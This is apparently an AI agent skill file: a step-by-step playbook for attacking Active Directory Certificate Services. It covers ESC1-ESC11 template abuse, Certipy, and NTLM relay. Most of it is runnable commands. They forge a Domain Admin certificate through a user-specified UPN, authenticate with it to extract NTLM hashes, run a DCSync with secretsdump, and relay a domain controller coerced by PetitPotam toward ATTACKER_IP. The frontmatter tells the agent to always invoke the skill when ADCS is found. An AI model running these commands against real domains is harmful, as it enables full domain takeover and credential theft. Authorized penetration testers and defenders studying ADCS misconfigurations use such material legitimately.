---
name: adcs-certipy-attack
description: "Active Directory Certificate Services (ADCS) certificate attacks. Use when a domain contains a CA server, ADCS Web Enrollment, or misconfigured certificate templates. Covers all ESC1-ESC11 certificate abuse paths, the Certipy toolchain, certificate forging, and NTLM relay to ADCS. Always use this skill whenever ADCS/CA/certificate/certsrv related content is discovered"
zh-signals: "针对 ADCS 证书模板错误配置的 ESC1-ESC11 证书滥用与 Certipy 攻击。信号:ADCS,证书攻击,Certipy,ESC1,域渗透,证书伪造"
when-to-use: "Use when a domain has a CA server, ADCS Web Enrollment, or misconfigured certificate templates, to exploit ESC1-ESC11 paths."
metadata:
  tags: "adcs,certipy,certificate,certificates,ca,esc1,esc2,esc3,esc4,esc8,domain controller,active directory,certificate attack,pkinit,certifried,CVE-2022-26923,dnshostname"
  category: "lateral"
---

# ADCS Certificate Attack Methodology

ADCS is the PKI infrastructure of Active Directory. Misconfigured certificate templates can let low-privileged users obtain Domain Admin rights directly — currently the most underrated yet most powerful attack surface in domain penetration.

## ⛔ Further Reading (Must Read)

- Detailed exploitation commands and conditions for ESC1-ESC11 → [references/esc-techniques.md](references/esc-techniques.md)
- Template ACL abuse (ESC4), ESC7/ESC11, template enumeration and cleanup → [references/template-acl-attacks.md](references/template-acl-attacks.md)
- Golden Certificate, Schannel authentication, certificate format conversion, persistence → [references/certificate-persistence.md](references/certificate-persistence.md)
- → [references/certifried-attack.md](references/certifried-attack.md) — CVE-2022-26923 Certifried machine account certificate spoofing

---

## Phase 1: ADCS Discovery

```bash
# Discover CA servers
netexec ldap DC_IP -u USER -p PASS -M adcs
# Outputs CA names and servers

# Certipy enumeration (recommended)
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -enabled -vulnerable
# Outputs a JSON/TXT report with vulnerable templates flagged automatically

# Manual LDAP query
ldapsearch -H ldap://DC_IP -D "USER@DOMAIN" -w PASS \
  -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com"
```

### ADCS Web Enrollment Detection
```bash
# Access the web interface
curl -sk https://CA_SERVER/certsrv/
# Returns 401 or a login page → ADCS Web Enrollment is present
```

## Phase 2: Vulnerability Decision Tree

```
What did you find?
├─ ESC1: the template allows the requester to specify the SAN → impersonate any user
├─ ESC2: the template has Any Purpose / SubCA → issue an arbitrary certificate
├─ ESC3: the template has Certificate Request Agent → request on behalf of others
├─ ESC4: write permission on a template → modify the template into ESC1
├─ ESC6: the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled → global ESC1
├─ ESC7: CA admin rights → issue rejected requests
├─ ESC8: ADCS Web Enrollment + NTLM Relay → relay to obtain a certificate
├─ ESC9/10/11: newer attack paths
└─ No obvious vulnerability → check NTLM relay to ADCS
Detailed commands → [references/esc-techniques.md](references/esc-techniques.md)
```

**Most common attack paths**:
1. **ESC1** — a misconfigured template exists, directly request a Domain Admin certificate
2. **ESC8** — PetitPotam + NTLM relay to ADCS to obtain a domain controller certificate
3. **ESC4** — a template with write permission is turned into ESC1 and then exploited

## Phase 3: ESC1 Fast Exploitation (Most Common)

ESC1 condition: the template allows `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (the requester can specify the SAN)

```bash
# Request a Domain Admin certificate with Certipy
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA_NAME -template VULN_TEMPLATE \
  -upn administrator@DOMAIN

# Authenticate with the certificate to get a TGT
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# Output: administrator  Hash: aad3b435...

# DCSync
impacket-secretsdump -hashes :HASH DOMAIN/administrator@DC_IP
```

## Phase 4: ESC8 Relay Attack

```bash
# 1. Start ntlmrelayx relaying to ADCS
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 2. Force the domain controller to authenticate
python3 PetitPotam.py ATTACKER_IP DC_IP

# 3. Obtain the domain controller certificate (Base64 output)
# Save it and authenticate
echo "BASE64" | base64 -d > dc.pfx
certipy auth -pfx dc.pfx -dc-ip DC_IP
```

## Phase 5: Certificate Authentication

```bash
# Certipy authentication (automatically requests a TGT and extracts the NTLM hash)
certipy auth -pfx user.pfx -dc-ip DC_IP

# If PKINIT is unavailable (error KDC_ERR_PADATA_TYPE_NOSUPP)
# Use Schannel authentication
certipy auth -pfx user.pfx -dc-ip DC_IP -ldap-shell

# Or use PassTheCert (default tool path: /pentest/PassTheCert/Python/)
python3 /pentest/PassTheCert/Python/passthecert.py -action ldap-shell -crt user.crt -key user.key -domain DOMAIN -dc-ip DC_IP
```

## Tool Quick Reference
| Tool | Purpose |
|------|------|
| certipy | Full ADCS enumeration + exploitation workflow |
| ntlmrelayx.py | NTLM relay to ADCS |
| PetitPotam | Force domain controller authentication |
| Rubeus | Certificate authentication on Windows |
| PassTheCert | Direct certificate authentication (no PKINIT) |

## Key Concepts
- **SAN** (Subject Alternative Name): the identity field in a certificate; ESC1 allows the requester to specify it → impersonate anyone
- **PKINIT**: use a certificate for Kerberos pre-authentication → obtain a TGT → extract the NTLM hash
- **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT**: template flag that allows the requester to customize the SAN = ESC1
